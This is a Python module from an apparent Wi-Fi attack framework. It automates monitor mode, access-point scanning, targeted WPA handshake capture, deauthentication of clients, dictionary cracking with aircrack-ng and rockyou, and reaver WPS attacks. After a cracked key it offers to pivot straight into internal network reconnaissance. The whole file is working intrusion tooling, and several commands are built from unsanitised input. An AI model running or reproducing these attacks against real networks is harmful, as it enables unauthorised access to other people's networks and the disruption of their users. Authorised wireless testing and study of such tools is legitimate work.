import os
import subprocess
from phantom.modules.base_module import BaseModule
from phantom.core.session import session
from phantom.core.executor import run_command, run_commands
from phantom.core.preview import PreviewSession
from phantom.utils.notifier import notifier
from rich.console import Console
from rich.table import Table

console = Console()

class WifiModule(BaseModule):
    module_name = "wifi"

    def __init__(self):
        super().__init__()
        self.interface = ""
        self.monitor_mode = False

    def preloop(self):
        """Check for root permissions before entering the module loop."""
        if os.name == 'posix' and os.geteuid() != 0:
            notifier.error("WiFi module requires ROOT permissions. Please restart Phantom with sudo.")
        
        notifier.status("WiFi Module loaded. Isolation mode active.")
        notifier.info("Ensure your wireless card supports injection.")

    def do_airmon(self, args):
        """airmon <start|stop|check> [interface] - Manage monitor mode."""
        parts = args.split()
        if not parts:
            notifier.error("Usage: airmon <start|stop|check> [interface]")
            return
        
        action = parts[0]
        if action == "check":
            run_command("airmon-ng check kill")
            return

        if len(parts) < 2:
            notifier.error("Usage: airmon <start|stop> <interface>")
            return
        
        iface = parts[1]
        cmd = f"sudo airmon-ng {action} {iface}"
        run_command(cmd)
        
        if action == "start":
            # In many systems it becomes wlan0mon
            self.interface = f"{iface}mon"
            self.monitor_mode = True
            notifier.success(f"Interface {self.interface} is now in Monitor Mode.")
        else:
            self.interface = iface
            self.monitor_mode = False
            notifier.success(f"Interface {iface} returned to Managed Mode.")

    def do_scan_aps(self, _):
        """scan-aps - Scan for Access Points using airodump-ng."""
        if not self.interface:
            notifier.error("Monitor interface not set. Use 'airmon start <iface>' first.")
            return
        
        notifier.status(f"Scanning for APs on {self.interface}. Press Ctrl+C to stop.")
        cmd = f"sudo airodump-ng {self.interface}"
        run_command(cmd)

    def do_handshake(self, args):
        """handshake <bssid> <channel> - Targeted handshake capture."""
        import re
        BSSID_REGEX = re.compile(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$')
        CHANNEL_REGEX = re.compile(r'^[0-9]{1,3}$')

        parts = args.split()
        if len(parts) < 2:
            notifier.error("Usage: handshake <bssid> <channel>")
            return
        
        bssid, channel = parts[0], parts[1]
        
        if not BSSID_REGEX.match(bssid):
            notifier.error(f"Invalid BSSID format: {bssid}")
            return
        if not CHANNEL_REGEX.match(channel) or not (1 <= int(channel) <= 196):
            notifier.error(f"Invalid channel: {channel}")
            return

        if not self.interface:
            notifier.error("Monitor interface not set.")
            return
            
        notifier.status(f"Starting handshake capture for {bssid} on channel {channel}...")
        os.makedirs("data/sessions", exist_ok=True)
        write_path = f"data/sessions/handshake_{bssid.replace(':', '')}"
        dump_cmd = f"sudo airodump-ng --bssid {bssid} --channel {channel} --write {write_path} {self.interface}"
        
        notifier.warn(f"Run deauth in another tab: sudo aireplay-ng -0 5 -a {bssid} {self.interface}")
        run_command(dump_cmd)

    def do_crack(self, args):
        """crack <cap_file> [wordlist] - Crack WPA/WPA2 handshake."""
        parts = args.split()
        if not parts:
            notifier.error("Usage: crack <cap_file> [wordlist]")
            return
        
        cap_file = parts[0]
        wordlist = parts[1] if len(parts) > 1 else session.active_wordlist or "/usr/share/wordlists/rockyou.txt"
        
        cmd = f"aircrack-ng -w {wordlist} {cap_file}"
        output = run_command(cmd)
        
        if "KEY FOUND!" in output:
            notifier.success("SUCCESS! KEY FOUND!")
            # Integration with core scan
            console.print("\n[bold cyan][?] Network cracked. Connect to the network and run internal scan?[/]")
            confirm = input("    Run scan now? [y/N]: ").strip().lower()
            if confirm == 'y':
                self._trigger_core_scan()
        else:
            notifier.error("Key not found.")

    def _trigger_core_scan(self):
        """Transition to core scan module."""
        notifier.status("Transitioning to Scan module for internal reconnaissance...")
        from phantom.modules.scan import ScanModule
        scan = ScanModule()
        scan.do_run("")

    def build_commands(self) -> dict:
        """Return preset WiFi command groups."""
        iface = self.interface or "wlan0"
        return {
            "SETUP": [
                "sudo airmon-ng check kill",
                f"sudo airmon-ng start {iface}",
            ],
            "SCAN": [
                f"sudo airodump-ng {iface}mon",
            ],
            "ATTACK": [
                f"sudo aireplay-ng --deauth 15 -a <BSSID> {iface}mon",
            ],
            "WPS": [
                f"sudo reaver -i {iface}mon -b <BSSID> -vv",
            ]
        }

    def do_preview(self, _):
        """Interactive command builder."""
        groups = self.build_commands()
        preview = PreviewSession(groups)
        chosen = preview.interactive()
        if chosen:
            run_commands(chosen)

    def do_run(self, _):
        self.do_preview(_)
